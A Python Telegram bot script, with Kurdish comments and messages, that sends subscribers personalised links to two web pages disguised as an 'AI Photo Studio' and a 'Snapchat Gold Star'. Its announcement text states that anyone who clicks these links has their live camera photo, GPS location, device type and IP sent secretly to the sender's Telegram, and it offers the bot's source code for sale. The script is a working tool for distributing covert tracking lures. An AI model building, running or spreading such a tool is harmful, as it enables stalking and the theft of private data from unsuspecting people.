from datetime import datetime, timedelta
import json
import os
import requests

TOKEN = os.environ.get("BOT_TOKEN")

# لینکە سەرەکییەکان
WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/"
SNAPCHAT_WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/snapchat.html"

def load_users():
    """خوێندنەوەی لیستی بەکارهێنەران لە فایلی users.json بە شێوەی ئۆبێکت/دیکشنری"""
    users_data = {}
    if os.path.exists("users.json"):
        try:
            with open("users.json", "r", encoding="utf-8") as f:
                content = f.read().strip()
                if content:
                    data = json.load(f)
                    if isinstance(data, list):
                        for uid in data:
                            users_data[str(uid)] = {"last_sent": None}
                    elif isinstance(data, dict):
                        users_data = data
        except Exception as e:
            print(f"هەڵە لە خوێندنەوەی users.json: {e}")
    
    admin_id = "6782298541"
    if admin_id not in users_data:
        users_data[admin_id] = {"last_sent": None}
        
    return users_data

def save_users(users_data):
    """پاشەکەوتکردنەوەی داتای بەکارهێنەران بۆ ناو فایلی users.json"""
    with open("users.json", "w", encoding="utf-8") as f:
        json.dump(users_data, f, indent=4, ensure_ascii=False)

def send_message(chat_id, text):
    """ناردنی نامە بۆ بەکارهێنەرێکی دیاریکراو"""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    response = requests.post(url, json=payload)
    print(f"وەڵامی ناردنی نامە بۆ {chat_id}: {response.json()}")
    return response.json()

def get_updates():
    """وەرگرتنی نامە نوێیەکان لە تەلەگرامەوە"""
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    response = requests.get(url)
    return response.json()

def main():
    if not TOKEN:
        print("تۆکەنی بۆت بونی نییە!")
        return

    users_data = load_users()
    print(f"لیستی بەکارهێنەران بۆ پشکنین: {users_data}")

    updates = get_updates()
    print(f"وەڵامی getUpdates: {updates}")

    if "result" in updates:
        for update in updates["result"]:
            if "message" in update and "chat" in update["message"]:
                chat_id = str(update["message"]["chat"]["id"])
                text = update["message"].get("text", "")

                if text == "/start":
                    if chat_id not in users_data:
                        users_data[chat_id] = {"last_sent": None}
                        print(f"بەکارهێنەری نوێ دۆزرایەوە و زیادکرا: {chat_id}")

    current_time = datetime.now()

    for user_id, info in users_data.items():
        last_sent_str = info.get("last_sent")
        should_send = False

        if last_sent_str is None:
            should_send = True
        else:
            last_sent_time = datetime.fromisoformat(last_sent_str)
            time_difference = current_time - last_sent_time
            
            if time_difference >= timedelta(hours=6):
                should_send = True

        if should_send:
            personal_link_ai = f"{WEB_APP_URL}?id={user_id}"
            personal_link_snap = f"{SNAPCHAT_WEB_APP_URL}?id={user_id}"

            announcement_text = (
                f"👋 سڵاو! ئەم سیستمە پێشکەوتووە لەلایەن **میلاد مزوری**ـەوە دروست کراوە.\n\n"
                f"ℹ️ **دەربارەی ئەم لینکانە:**\n"
                f"ئەم لینکانە تایبەتن بە کۆکردنەوەی زانیاری تەکنیکی و وێنەی کەسی بەرامبەر. کاتێک ئەم لینکانە بۆ هەر کەسێک دەنێریت و کلیکیان لەسەر دەکات، سەرجەم زانیارییە وردەکانی ئامێرەکەی (وەک وێنەی ڕاستەوخۆ، لۆکەیشنی GPS، جۆری ئامێر، IP و هتد) ڕاستەوخۆ و بە نهێنی بۆخۆت دێنەوە بۆ تەلەگرام.\n\n"
                f"🔗 **1. لینکی یەکەم (AI Photo Studio - بە کوردی):**\n"
                f"{personal_link_ai}\n\n"
                f"🔗 **2. لینکی دووەم (Snapchat Gold Star - بە ئینگلیزی):**\n"
                f"{personal_link_snap}\n\n"
                f"💡 **تێبینی و دڵنیایی:**\n"
                f"دەتوانیت پێش ئەوەی لینکەکان بۆ کەسێکی تر بنێریت، خۆت سەرەتا تاقییان بکەیتەوە و کلیکیان لەسەر بکەیت تاوەکو زانیارییەکانت بۆ بێنەوە.\n\n"
                f"💬 **سەبارەت به سەرنج و تێبینی:**\n"
                f"بۆ هەر سەرنج و تێبینییەک دەتوانیت نامە بۆ دروستکەری ئەم بۆتە (میلاد غازی) بنێریت:\n"
                f"https://t.me/MiladGhaziHussein\n\n"
                f"🛒 **داواکردنی هەمان بۆت:**\n"
                f"ئەگەر تۆش دەتەوێت **هەمان ئەم بۆتە بە ناوی خۆتەوە هەبێت، دەتوانیت سۆرس کۆدی بۆتەکە بکڕیت:\n"
                f"• سۆرس کۆدی بۆتەکە بە فێرکارییەوە: ٢٠،٠٠٠ دینار**\n"
                f"• سۆرس کۆدی بۆتەکە بێ فێرکاری: **١٥،٠٠٠ دینار**"
            )
            
            res = send_message(user_id, announcement_text)
            
            if "ok" in res and res["ok"]:
                users_data[user_id]["last_sent"] = current_time.isoformat()
                print(f"نامە سەرکەوتووانە نێردرا بۆ {user_id}")

    save_users(users_data)

if __name__ == "__main__":
    main()
